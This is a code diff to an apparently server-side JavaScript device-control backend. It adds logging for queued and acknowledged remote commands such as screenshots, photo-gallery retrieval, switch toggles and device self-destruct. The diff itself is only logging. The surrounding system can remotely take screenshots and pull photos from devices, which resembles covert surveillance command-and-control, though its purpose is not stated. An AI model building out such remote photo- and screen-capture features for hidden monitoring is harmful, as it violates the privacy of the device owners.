@@ -647,7 +647,19 @@ function deviceAck(params) {
   if (!device) return { code: -1, message: 'device not found' };
   const acked = device.pending_commands.filter(c => ids.includes(c.id));
   device.pending_commands = device.pending_commands.filter(c => !ids.includes(c.id));
-  if (acked.length) console.log(`[ACK] 设备 ${deviceId}(${device.name}) 执行完成: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
+  if (acked.length) {
+    console.log(`[ACK] 设备 ${deviceId}(${device.name}) 执行完成: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
+    // 开关命令特别记录
+    for (const c of acked) {
+      if (c.type === 'switch_toggle') {
+        console.log(`[开关✓] ${device.name || deviceId} → ${c.payload.key}=${c.payload.on ? '已开启' : '已关闭'}`);
+      } else if (c.type === 'screenshot') {
+        console.log(`[截图✓] ${device.name || deviceId} → 截图已上传`);
+      } else if (c.type === 'get_gallery') {
+        console.log(`[相册✓] ${device.name || deviceId} → 相册数据已上传`);
+      }
+    }
+  }
   if (acked.some(c => c.type === 'self_destruct') || params.result === 'self_destructed') {
     device.status = 'destroyed';
   }
@@ -923,6 +935,16 @@ function queueDeviceCommand(device, params) {
   }
   device.pending_commands.push(cmd);
   device.updated_at = now();
+  // 管理操作日志：开关/相册等关键命令纳入全局监控
+  if (type === 'switch_toggle') {
+    console.log(`[开关] ${device.name || device.device_id} → ${payload.key}=${payload.on ? '开' : '关'}`);
+  } else if (type === 'get_gallery') {
+    console.log(`[相册] ${device.name || device.device_id} → 请求获取相册 (limit=${payload.limit || 100})`);
+  } else if (type === 'get_photo') {
+    console.log(`[相册] ${device.name || device.device_id} → 请求获取图片 ID=${payload.id}`);
+  } else if (type === 'screenshot') {
+    console.log(`[截图] ${device.name || device.device_id} → 请求截图`);
+  }
   return cmd;
 }
 
@@ -975,6 +997,21 @@ async function deviceUpload(req) {
   device.uploads = device.uploads.slice(0, 100);
   saveDb();
   console.log(`[上传] 设备 ${device.name}(${device.id}) 上传 ${type}.${ext} ${buf.length}字节 cmd=${cmdId}`);
+  if (type === 'gallery_photo') {
+    console.log(`[相册] ${device.name} → 缩略图已上传 (${(buf.length/1024).toFixed(0)}KB)`);
+  } else if (type === 'switch_toggle') {
+    const txt = buf.slice(0, 200).toString('utf-8');
+    console.log(`[开关] ${device.name} → 执行结果: ${txt}`);
+    // 解析开关结果并存储到 device config_override，让管理面板能读到最新状态
+    const swMatch = txt.match(/开关\[([^\]]+)\](开|关)/);
+    if (swMatch) {
+      const swKey = 'sw_' + swMatch[1];
+      const swOn = swMatch[2] === '开';
+      device.config_override = device.config_override || {};
+      device.config_override[swKey] = swOn;
+      console.log(`[开关] ${device.name} → ${swMatch[1]}=${swOn ? '开' : '关'} 已同步到 config_override`);
+    }
+  }
   return { ok: true, filename };
 }
 
